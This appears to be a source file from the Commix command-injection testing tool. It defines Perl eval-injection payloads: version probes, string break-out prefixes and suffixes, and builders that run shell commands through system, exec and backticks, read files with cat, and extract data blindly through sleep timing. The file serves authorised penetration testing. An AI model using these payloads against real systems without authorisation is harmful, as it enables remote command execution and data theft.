#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

NAME = "perl"

# The same name as it is written out to the user, where the switch's own spelling would read wrong.
LABEL = "Perl"

# An expression whose value says at once that code was evaluated, and which build evaluated it.
# '$]' is the interpreter's own version number, '$^O' the platform it was built for - neither one
# alone is unique to Perl, but nothing else renders this exact pair back in this exact order.
PROBE = "$] . $^O"

# The probe on its own, and wrapped in what would render it where the bare value is not.
PROBE_FUNCTIONS = ["" + PROBE + "",
  "(" + PROBE + ")"
]

# The same probes broken into the string being evaluated, one boundary per row.
PROBE_PAYLOADS = [
  [x for x in PROBE_FUNCTIONS],
  ["." + x for x in PROBE_FUNCTIONS],
  ["'." + x + ".'" for x in PROBE_FUNCTIONS],
  ["\"." + x + ".\"" for x in PROBE_FUNCTIONS],
  ["')." + x + ".('" for x in PROBE_FUNCTIONS]
]

PROBE_PAYLOADS = [x for payload in PROBE_PAYLOADS for x in payload]

# What the probe's own value looks like coming back, and the complaints that say a payload reached
# an evaluated string even where nothing was rendered.
PROBE_REGEX = r"(\d+\.\d+)(?:linux|darwin|MSWin32|freebsd|openbsd|solaris|cygwin)"
WARNINGS = ["syntax error", "at (eval", "Global symbol", "Can't locate", "Undefined subroutine"]

"""
The language's own functions that run a command, widest first as the level rises.

Each is written as a bare name a payload can wrap in a call - the backtick operator runs a command
too, and is reached through 'run()' below rather than named here, since it is not a call this
prefix scheme can wrap.
"""
EXECUTION_FUNCTIONS_LVL1 = ["system"]
EXECUTION_FUNCTIONS_LVL2 = EXECUTION_FUNCTIONS_LVL1 + ["exec"]
EXECUTION_FUNCTIONS_LVL3 = EXECUTION_FUNCTIONS_LVL2

# Breaking out of the evaluated string, and closing it again behind the payload.
SEPARATORS_LVL1 = [""]
SEPARATORS_LVL2 = SEPARATORS_LVL1 + ["\n"]
SEPARATORS_LVL3 = SEPARATORS_LVL2 + ["\r\n"]

# The whole value as the expression, concatenation onto a value that is already one (with '.', not
# '+' - this language's own concatenation operator), and concatenation out of a quoted string the
# value sits inside.
PREFIXES_LVL1 = ["", ".", "'.", "\"."]
PREFIXES_LVL2 = PREFIXES_LVL1 + ["')." , "\")." , "',", "\","]
PREFIXES_LVL3 = PREFIXES_LVL2 + ["';", "\";", ";", ")", "']", "\"]", "'}", "\"}"]

SUFFIXES_LVL1 = ["", ".'", ".\""]
SUFFIXES_LVL2 = SUFFIXES_LVL1 + [".('", ".(\"", "#"]
SUFFIXES_LVL3 = SUFFIXES_LVL2 + ["'#", "\"#", ")#", "]#", "}#", ",'", ",\""]

# How one of the functions above is reached, as a prefix a payload is wrapped in.
def execution_prefix(function):
  return function + "("

"""
Wrap the shell commands a payload runs in what this language renders them with.

There is no statement here that writes to the response the way another language's print does: what
the application renders is the value of the expression it evaluated, so the commands' output is
concatenated and handed back as that value.
"""
def print_statement(separator, commands, chain=None):
  if separator == "":
    return ".".join(run(command) for command in commands)
  return run((chain or separator).join(commands))

"""
The expressions every payload is built out of, spelled the way this language spells them.
"""

"""
A string literal holding the given text.

Written inside '${\\ ... }', which interpolates one expression's value as-is - unlike a bare
backtick string, which reads '$' and '@' in whatever it is given as its own interpolation, however
much of the command they were never meant to be. 'sleep', 'exit' and the rest of this grammar never
go through this, so only run() and read_file() need it.
"""
def _literal(text):
  text = text.replace("\\", "\\\\").replace("\"", "\\\"").replace("$", "\\$").replace("@", "\\@")
  return "\"" + text + "\""

# Run a command and yield its output, through the backtick operator.
def run(cmd):
  return "`${\\" + _literal(cmd) + "}`"

# Read a file and yield its contents.
def read_file(path):
  return run("cat " + path)

# Drop trailing whitespace, so a length agrees with what a shell's own substitution would report.
def trim(expr):
  return "((" + expr + ")=~s/\\s+\\z//r)"

# How many bytes an expression is.
def length(expr):
  return "length(" + expr + ")"

# The ordinal of an expression's Nth byte, counting from zero.
def ordinal(expr, index):
  return "ord(substr(" + expr + "," + str(index) + ",1))"

# An expression's value read as a number, for a command whose output is one - '+0' numeric context
# answers 0 for anything that is not one, the same as every other grammar's own fallback here.
def to_number(expr):
  return "((" + expr + ")+0)"

# Wait for as long as the condition is true, and no time at all when it is false.
def delay(timesec, condition):
  return "sleep(" + str(timesec) + "*(" + condition + "))"

"""
Stop the page where the condition does not hold, so what comes back says which it was.
"""
def halt(condition):
  # Empty string rather than a number: the value is spliced into whatever the target was building,
  # and only a string leaves that expression intact for the page to render as it normally would.
  return "((" + condition + ")?\"\":exit())"

"""
Evaluate one expression and then another, within a single expression.

The comma operator discards its first side and yields its second only in scalar context - in list
context, the one 'print' or an outer list assignment would give it, both sides come back instead,
first included. 'scalar(...)' forces the one this grammar means regardless of where it then sits.
"""
def sequence(first, second):
  return "scalar((" + first + "," + second + "))"

# The shell's comparison operators, as this language spells them.
COMPARISON = {"-le": "<=", "-ge": ">=", "-lt": "<", "-gt": ">", "-eq": "==", "-ne": "!="}

# What ends a statement, where the boundary being tested can carry one.
TERMINATOR = ";"

# eof
